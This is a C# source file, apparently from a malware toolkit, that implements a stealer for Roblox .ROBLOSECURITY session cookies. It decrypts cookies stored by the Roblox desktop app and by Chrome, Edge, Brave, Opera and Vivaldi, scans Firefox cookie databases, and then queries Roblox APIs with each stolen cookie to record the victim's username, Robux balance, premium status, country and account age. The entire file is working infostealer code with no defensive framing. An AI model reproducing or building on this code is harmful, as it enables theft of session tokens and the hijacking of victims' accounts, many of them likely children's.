// RobloxCookieStealer — collects .ROBLOSECURITY cookies from:
//   • Roblox UWP / desktop app (.dat files, DPAPI-encrypted)
//   • Chromium-based browsers (AES-GCM master key path)
//   • Firefox (plain SQLite scan)
// After collection each cookie is enriched via the Roblox REST API.

using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

// Minimal JSON helpers (no external dep)
using PureAIO.Client.Util;

namespace PureAIO.Client.Stealers
{
    public static class RobloxCookieStealer
    {
        // ── Entry point ───────────────────────────────────────────────────────
        public static List<CookieEntry> Collect()
        {
            var results = new List<CookieEntry>();
            Try(() => CollectFromRobloxApp(results));
            Try(() => CollectFromChromiumBrowsers(results));
            Try(() => CollectFromFirefox(results));

            // De-duplicate by value, then enrich
            var seen    = new HashSet<string>(StringComparer.Ordinal);
            var unique  = new List<CookieEntry>();
            foreach (var e in results)
            {
                if (seen.Add(e.Value))
                {
                    EnrichRoblox(e);
                    unique.Add(e);
                }
            }
            return unique;
        }

        // ── 1. Roblox app DPAPI .dat files ────────────────────────────────────
        private static readonly string[] _datRoots =
        {
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Roblox"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),      "Roblox"),
        };

        // Five entropy values as seen in reversed robloxappcook.exe
        private static readonly byte[][] _entropies =
        {
            Encoding.UTF8.GetBytes(""),
            Encoding.UTF8.GetBytes("ROBLOX"),
            Encoding.UTF8.GetBytes("ROBLOX_COOKIE"),
            Encoding.UTF8.GetBytes("Roblox"),
            Encoding.UTF8.GetBytes("roblox"),
        };

        private static void CollectFromRobloxApp(List<CookieEntry> results)
        {
            foreach (var root in _datRoots)
            {
                if (!Directory.Exists(root)) continue;
                foreach (var file in Directory.GetFiles(root, "*.dat", SearchOption.AllDirectories))
                    Try(() => ProcessDatFile(file, results));
            }
        }

        private static void ProcessDatFile(string path, List<CookieEntry> results)
        {
            var json = File.ReadAllText(path, Encoding.UTF8);
            if (!json.Contains("CookiesData")) return;

            // {"CookiesData":"<base64>"}
            var m = Regex.Match(json, @"""CookiesData""\s*:\s*""([^""]+)""");
            if (!m.Success) return;

            var encrypted = Convert.FromBase64String(m.Groups[1].Value);
            foreach (var entropy in _entropies)
            {
                try
                {
                    var plainBytes = ProtectedData.Unprotect(encrypted, entropy,
                                                             DataProtectionScope.CurrentUser);
                    var plain = Encoding.UTF8.GetString(plainBytes);
                    var cookie = ExtractRobloSecurity(plain);
                    if (cookie != null)
                    {
                        results.Add(new CookieEntry
                        {
                            Source = "RobloxApp:" + Path.GetFileName(path),
                            Value  = cookie
                        });
                    }
                    break;
                }
                catch { /* wrong entropy, try next */ }
            }
        }

        // ── 2. Chromium browsers ──────────────────────────────────────────────
        private static readonly (string name, string path)[] _browsers =
        {
            ("Chrome",         Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                                            @"Google\Chrome\User Data")),
            ("Edge",           Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                                            @"Microsoft\Edge\User Data")),
            ("Brave",          Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                                            @"BraveSoftware\Brave-Browser\User Data")),
            ("Opera",          Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                                            @"Opera Software\Opera Stable")),
            ("OperaGX",        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                                            @"Opera Software\Opera GX Stable")),
            ("Vivaldi",        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                                            @"Vivaldi\User Data")),
        };

        private static void CollectFromChromiumBrowsers(List<CookieEntry> results)
        {
            foreach (var (name, ud) in _browsers)
            {
                if (!Directory.Exists(ud)) continue;
                var key = GetChromeMasterKey(ud);
                if (key == null) continue;

                foreach (var profile in ChromiumProfiles(ud))
                {
                    var cookieDb = Path.Combine(profile, "Network", "Cookies");
                    if (!File.Exists(cookieDb))
                        cookieDb = Path.Combine(profile, "Cookies");
                    if (!File.Exists(cookieDb)) continue;

                    Try(() =>
                    {
                        var cookies = ExtractChromiumCookies(cookieDb, key);
                        foreach (var c in cookies)
                            results.Add(new CookieEntry
                            {
                                Source = name + ":" + Path.GetFileName(profile),
                                Value  = c
                            });
                    });
                }
            }
        }

        private static IEnumerable<string> ChromiumProfiles(string ud)
        {
            yield return Path.Combine(ud, "Default");
            var i = 1;
            while (Directory.Exists(Path.Combine(ud, "Profile " + i)))
                yield return Path.Combine(ud, "Profile " + i++);
        }

        private static byte[] GetChromeMasterKey(string ud)
        {
            var ls = Path.Combine(ud, "Local State");
            if (!File.Exists(ls)) return null;
            var json = File.ReadAllText(ls, Encoding.UTF8);
            var m    = Regex.Match(json, @"""encrypted_key""\s*:\s*""([^""]+)""");
            if (!m.Success) return null;
            var blob = Convert.FromBase64String(m.Groups[1].Value);
            // Strip 5-byte "DPAPI" prefix
            if (blob.Length < 5) return null;
            var dpapi = new byte[blob.Length - 5];
            Buffer.BlockCopy(blob, 5, dpapi, 0, dpapi.Length);
            try
            {
                return ProtectedData.Unprotect(dpapi, null, DataProtectionScope.CurrentUser);
            }
            catch { return null; }
        }

        private static List<string> ExtractChromiumCookies(string dbPath, byte[] key)
        {
            var tmp = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".db");
            File.Copy(dbPath, tmp, true);
            var found = new List<string>();
            try
            {
                var raw = File.ReadAllBytes(tmp);
                // Binary scan for .ROBLOSECURITY blobs (v10/v11)
                ParseChromiumCookiesRaw(raw, key, found);
            }
            finally
            {
                try { File.Delete(tmp); } catch { }
            }
            return found;
        }

        private static readonly byte[] _v10 = Encoding.ASCII.GetBytes("v10");
        private static readonly byte[] _v11 = Encoding.ASCII.GetBytes("v11");

        private static void ParseChromiumCookiesRaw(byte[] raw, byte[] key, List<string> found)
        {
            // Pattern: ".ROBLOSECURITY\x00\x00\x00<blob>" in SQLite pages
            var nameBytes = Encoding.UTF8.GetBytes(".ROBLOSECURITY");
            for (int i = 0; i < raw.Length - nameBytes.Length - 20; i++)
            {
                if (!Match(raw, i, nameBytes)) continue;

                // Scan forward up to 512 bytes for a v10/v11 blob or plaintext cookie
                for (int j = i + nameBytes.Length; j < Math.Min(i + nameBytes.Length + 512, raw.Length - 3); j++)
                {
                    if (Match(raw, j, _v10) || Match(raw, j, _v11))
                    {
                        // 12-byte nonce follows immediately
                        if (j + 3 + 12 >= raw.Length) break;
                        int nonceSt = j + 3;
                        // Extract until SQLite page boundary (look for next NUL run or reasonable length)
                        int blobLen = FindBlobEnd(raw, nonceSt, 512);
                        if (blobLen < 29) break; // too short for nonce + tag
                        var blob  = new byte[blobLen];
                        Buffer.BlockCopy(raw, nonceSt, blob, 0, blobLen);
                        var plain = DecryptAesGcmBcrypt(key, blob);
                        if (plain != null)
                        {
                            var cookie = ExtractRobloSecurity(plain);
                            if (cookie != null) { found.Add(cookie); break; }
                            if (plain.StartsWith("_|WARNING", StringComparison.Ordinal) ||
                                plain.StartsWith("_|", StringComparison.Ordinal))
                            { found.Add(plain.TrimEnd('\0')); break; }
                        }
                        break;
                    }
                    // Plaintext scan
                    int remaining = Math.Min(512, raw.Length - j);
                    var seg = Encoding.UTF8.GetString(raw, j, remaining);
                    var c   = ExtractRobloSecurity(seg);
                    if (c != null) { found.Add(c); break; }
                }
            }
        }

        private static bool Match(byte[] buf, int pos, byte[] pat)
        {
            if (pos + pat.Length > buf.Length) return false;
            for (int k = 0; k < pat.Length; k++)
                if (buf[pos + k] != pat[k]) return false;
            return true;
        }

        private static int FindBlobEnd(byte[] buf, int start, int maxLen)
        {
            int end = Math.Min(start + maxLen, buf.Length);
            int len = end - start;
            // Walk back past trailing nulls
            while (len > 29 && buf[start + len - 1] == 0) len--;
            return len;
        }

        // ── AES-GCM via BCrypt P/Invoke (NET 4.7.2 has no managed AES-GCM) ──
        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        static extern int BCryptOpenAlgorithmProvider(out IntPtr h, string alg, string impl, uint flags);
        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        static extern int BCryptSetProperty(IntPtr h, string prop, byte[] val, int len, uint flags);
        [DllImport("bcrypt.dll")]
        static extern int BCryptGenerateSymmetricKey(IntPtr h, out IntPtr hKey, byte[] obj, int objLen, byte[] secret, int secLen, uint flags);
        [DllImport("bcrypt.dll")]
        static extern int BCryptDecrypt(IntPtr hKey, byte[] ct, int ctLen, ref AUTH_INFO authInfo,
                                        byte[] iv, int ivLen, byte[] pt, int ptLen, out int result, uint flags);
        [DllImport("bcrypt.dll")]
        static extern int BCryptDestroyKey(IntPtr hKey);
        [DllImport("bcrypt.dll")]
        static extern int BCryptCloseAlgorithmProvider(IntPtr h, uint flags);

        [StructLayout(LayoutKind.Sequential)]
        struct AUTH_INFO
        {
            public int    cbSize;
            public int    dwInfoVersion;
            public IntPtr pbNonce;
            public int    cbNonce;
            public IntPtr pbAuthData;
            public int    cbAuthData;
            public IntPtr pbTag;
            public int    cbTag;
            public IntPtr pbMacContext;
            public int    cbMacContext;
            public int    cbAAD;
            public long   cbData;
            public uint   dwFlags;
        }

        private static string DecryptAesGcmBcrypt(byte[] key, byte[] blob)
        {
            // blob = 12-byte nonce | ciphertext | 16-byte GCM tag
            if (blob.Length < 29) return null;
            const int nonceLen = 12;
            const int tagLen   = 16;
            var nonce  = new byte[nonceLen];
            var ctLen  = blob.Length - nonceLen - tagLen;
            if (ctLen <= 0) return null;
            var ct  = new byte[ctLen];
            var tag = new byte[tagLen];
            Buffer.BlockCopy(blob, 0, nonce, 0, nonceLen);
            Buffer.BlockCopy(blob, nonceLen, ct, 0, ctLen);
            Buffer.BlockCopy(blob, nonceLen + ctLen, tag, 0, tagLen);

            BCryptOpenAlgorithmProvider(out var hAlg, "AES", null, 0);
            var chainMode = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
            BCryptSetProperty(hAlg, "ChainingMode", chainMode, chainMode.Length, 0);
            BCryptGenerateSymmetricKey(hAlg, out var hKey, null, 0, key, key.Length, 0);

            var tagHandle   = GCHandle.Alloc(tag,   GCHandleType.Pinned);
            var nonceHandle = GCHandle.Alloc(nonce, GCHandleType.Pinned);
            try
            {
                var ai = new AUTH_INFO
                {
                    cbSize        = Marshal.SizeOf(typeof(AUTH_INFO)),
                    dwInfoVersion = 1,
                    pbNonce       = nonceHandle.AddrOfPinnedObject(),
                    cbNonce       = nonceLen,
                    pbTag         = tagHandle.AddrOfPinnedObject(),
                    cbTag         = tagLen,
                };
                var pt = new byte[ctLen];
                BCryptDecrypt(hKey, ct, ctLen, ref ai, null, 0, pt, ctLen, out _, 0);
                BCryptDestroyKey(hKey);
                BCryptCloseAlgorithmProvider(hAlg, 0);
                return Encoding.UTF8.GetString(pt).TrimEnd('\0');
            }
            finally
            {
                tagHandle.Free();
                nonceHandle.Free();
            }
        }

        // ── 3. Firefox ─────────────────────────────────────────────────────────
        private static void CollectFromFirefox(List<CookieEntry> results)
        {
            var profilesRoot = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                @"Mozilla\Firefox\Profiles");
            if (!Directory.Exists(profilesRoot)) return;

            foreach (var dir in Directory.GetDirectories(profilesRoot))
            {
                var db = Path.Combine(dir, "cookies.sqlite");
                if (!File.Exists(db)) continue;
                Try(() =>
                {
                    var tmp = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".db");
                    File.Copy(db, tmp, true);
                    try
                    {
                        var raw   = File.ReadAllBytes(tmp);
                        var text  = Encoding.UTF8.GetString(raw);
                        var c     = ExtractRobloSecurity(text);
                        if (c != null)
                            results.Add(new CookieEntry
                            {
                                Source = "Firefox:" + Path.GetFileName(dir),
                                Value  = c
                            });
                    }
                    finally { try { File.Delete(tmp); } catch { } }
                });
            }
        }

        // ── Helper: regex extract ─────────────────────────────────────────────
        private static readonly Regex _cookieRx = new Regex(
            @"_\|WARNING:-DO-NOT-SHARE-THIS[^\x00\x01\x09\x0A\x0D\x20-\xFF]{0,2}(?:[A-Z0-9_]+)?(?:\.[A-Za-z0-9_\-]+)+",
            RegexOptions.Compiled);

        private static string ExtractRobloSecurity(string text)
        {
            // Direct .ROBLOSECURITY= header value
            var m = Regex.Match(text, @"\.ROBLOSECURITY=([^;\s\x00]{20,})");
            if (m.Success) return m.Groups[1].Value.Trim();

            // Raw warning token format
            var m2 = _cookieRx.Match(text);
            if (m2.Success) return m2.Value.Trim();

            return null;
        }

        // ── Roblox API enrichment ─────────────────────────────────────────────
        private static void EnrichRoblox(CookieEntry e)
        {
            try
            {
                // 1. Authenticated user info
                var me = RobloxGet("https://users.roblox.com/v1/users/authenticated", e.Value);
                if (me == null) { e.EnrichError = "auth_failed"; return; }

                e.UserId      = SimpleJson.GetLong(me,   "id");
                e.Username    = SimpleJson.GetString(me, "name");
                e.DisplayName = SimpleJson.GetString(me, "displayName");

                if (e.UserId == 0) { e.EnrichError = "no_id"; return; }

                // 2. Robux balance
                var econ = RobloxGet($"https://economy.roblox.com/v1/user/currency", e.Value);
                if (econ != null)
                    e.Robux = SimpleJson.GetLong(econ, "robux");

                // 3. Premium membership
                var prem = RobloxGet(
                    $"https://premiumfeatures.roblox.com/v1/users/{e.UserId}/validate-membership", e.Value);
                if (prem != null)
                    e.IsPremium = prem.Trim() == "true";

                // 4. Country code via account-info (best-effort)
                var info = RobloxGet($"https://www.roblox.com/my/account/json", e.Value);
                if (info != null)
                {
                    e.Country = SimpleJson.GetString(info, "CountryCodeForBillingAddress")
                             ?? SimpleJson.GetString(info, "UserCountry");
                }

                // 5. Account age from user detail endpoint
                var detail = RobloxGet($"https://users.roblox.com/v1/users/{e.UserId}", e.Value);
                if (detail != null)
                    e.AccountAge = SimpleJson.GetString(detail, "created");
            }
            catch (Exception ex)
            {
                e.EnrichError = ex.Message.Length > 60
                    ? ex.Message.Substring(0, 60)
                    : ex.Message;
            }
        }

        private static string RobloxGet(string url, string cookie)
        {
            try
            {
                var req = (HttpWebRequest)WebRequest.Create(url);
                req.Method  = "GET";
                req.Timeout = 8_000;
                req.Headers["Cookie"] = ".ROBLOSECURITY=" + cookie;
                req.UserAgent = "Roblox/WinInet";

                using var resp = (HttpWebResponse)req.GetResponse();
                using var sr   = new System.IO.StreamReader(resp.GetResponseStream(), Encoding.UTF8);
                return sr.ReadToEnd();
            }
            catch { return null; }
        }

        // ── Fault-tolerant wrapper ────────────────────────────────────────────
        private static void Try(Action a) { try { a(); } catch { } }
    }
}
